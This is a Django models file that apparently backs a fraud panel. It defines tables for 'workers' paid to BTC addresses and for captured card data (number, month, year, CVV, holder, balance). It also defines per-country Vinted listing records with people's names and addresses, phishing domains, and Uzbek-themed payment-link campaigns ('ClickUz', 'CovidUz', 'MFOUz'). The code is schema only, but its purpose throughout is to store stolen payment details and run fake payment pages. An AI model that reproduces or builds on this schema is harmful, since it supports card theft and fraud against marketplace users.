from django.db import models


class Workers(models.Model):
    user_id = models.CharField('user id', max_length=250)
    user_nick = models.CharField('user nick', max_length=250)
    massage = models.CharField('message', max_length=250)
    btc_adres = models.CharField('btc_adrec', max_length=250)

    def __str__(self):
        return self.user_id


class InfoLink(models.Model):
    user_id = models.CharField('user_id', max_length=250)
    img_url = models.CharField('img url', max_length=250)
    name = models.CharField('name', max_length=250)
    price = models.CharField('price', max_length=250)
    title = models.CharField('title', max_length=250)
    adres = models.CharField('adres', max_length=250)
    lastname = models.CharField('lastname', max_length=250)
    firstname = models.CharField('firstname', max_length=250)

    def __str__(self):
        return str(self.id)


class Cards(models.Model):
    num = models.CharField('num', max_length=250)
    year = models.CharField('year', max_length=250)
    cvv = models.CharField('cvv', max_length=250)
    month = models.CharField('month', max_length=250)
    card_holder = models.CharField('card holder', max_length=250)
    card_balance = models.CharField('card balance', max_length=250)
    id_ob = models.CharField('card balance', max_length=250)

    def __str__(self):
        return self.num


class EnglandVinted(models.Model):
    user_id = models.CharField('user_id', max_length=250)
    img_url = models.CharField('img url', max_length=250)
    name = models.CharField('name', max_length=250)
    price = models.CharField('price', max_length=250)
    title = models.CharField('title', max_length=250)
    adres = models.CharField('adres', max_length=250)
    lastname = models.CharField('lastname', max_length=250)
    firstname = models.CharField('firstname', max_length=250)


class SlovakiaVinted(models.Model):
    user_id = models.CharField('user_id', max_length=250)
    img_url = models.CharField('img url', max_length=250)
    name = models.CharField('name', max_length=250)
    price = models.CharField('price', max_length=250)
    title = models.CharField('title', max_length=250)
    adres = models.CharField('adres', max_length=250)
    lastname = models.CharField('lastname', max_length=250)
    firstname = models.CharField('firstname', max_length=250)


class FranceVinted(models.Model):
    user_id = models.CharField('user_id', max_length=250)
    img_url = models.CharField('img url', max_length=250)
    name = models.CharField('name', max_length=250)
    price = models.CharField('price', max_length=250)
    title = models.CharField('title', max_length=250)
    adres = models.CharField('adres', max_length=250)
    lastname = models.CharField('lastname', max_length=250)
    firstname = models.CharField('firstname', max_length=250)


class SpainVinted(models.Model):
    user_id = models.CharField('user_id', max_length=250)
    img_url = models.CharField('img url', max_length=250)
    name = models.CharField('name', max_length=250)
    price = models.CharField('price', max_length=250)
    title = models.CharField('title', max_length=250)
    adres = models.CharField('adres', max_length=250)
    lastname = models.CharField('lastname', max_length=250)
    firstname = models.CharField('firstname', max_length=250)
    user_name = models.CharField('user_name', max_length=250)


class Admin(models.Model):
    user_id = models.CharField('user id', max_length=250)
    status = models.CharField('status', max_length=250)


class Domains(models.Model):
    link = models.CharField('link', max_length=250)
    service = models.CharField('service', max_length=250)


class ClickUz(models.Model):
    user_id = models.CharField('user id', max_length=250)
    username = models.CharField('username', max_length=250)
    sum = models.CharField('price', max_length=250)
    link = models.CharField('link', max_length=250)


class ClickPresent(models.Model):
    user_id = models.CharField('user id', max_length=250)
    username = models.CharField('username', max_length=250)
    sum = models.CharField('price', max_length=250)
    link = models.CharField('link', max_length=250)


class CovidUz(models.Model):
    user_id = models.CharField('user id', max_length=250)
    username = models.CharField('username', max_length=250)
    sum = models.CharField('price', max_length=250)
    link = models.CharField('link', max_length=250)


class MFOUz(models.Model):
    user_id = models.CharField('user id', max_length=250)
    username = models.CharField('username', max_length=250)
    link = models.CharField('link', max_length=250)